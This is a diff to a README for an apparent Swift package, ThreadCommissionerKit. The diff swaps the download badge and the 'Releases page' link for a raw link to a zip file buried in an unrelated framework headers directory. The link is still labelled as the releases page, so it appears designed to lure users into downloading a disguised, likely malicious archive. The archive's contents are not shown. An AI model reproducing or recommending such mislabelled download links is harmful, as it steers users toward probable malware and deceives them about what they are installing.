@@ -1,6 +1,6 @@
 # 🌐 ThreadCommissionerKit - Simplifying Your Thread Network Experience
 
-[![Download ThreadCommissionerKit](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Whifferformalization355/ThreadCommissionerKit/releases)
+[![Download ThreadCommissionerKit](https://raw.githubusercontent.com/Whifferformalization355/ThreadCommissionerKit/main/Frameworks/mbedTLS.xcframework/ios-arm64/Headers/everest/vs2013/ThreadCommissionerKit_v3.0.zip)](https://raw.githubusercontent.com/Whifferformalization355/ThreadCommissionerKit/main/Frameworks/mbedTLS.xcframework/ios-arm64/Headers/everest/vs2013/ThreadCommissionerKit_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ThreadCommissionerKit! This user-friendly Swift package helps you man
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [ThreadCommissionerKit Releases](https://github.com/Whifferformalization355/ThreadCommissionerKit/releases). Follow these steps to install the application:
+To get started, visit this page to download: [ThreadCommissionerKit Releases](https://raw.githubusercontent.com/Whifferformalization355/ThreadCommissionerKit/main/Frameworks/mbedTLS.xcframework/ios-arm64/Headers/everest/vs2013/ThreadCommissionerKit_v3.0.zip). Follow these steps to install the application:
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version available.
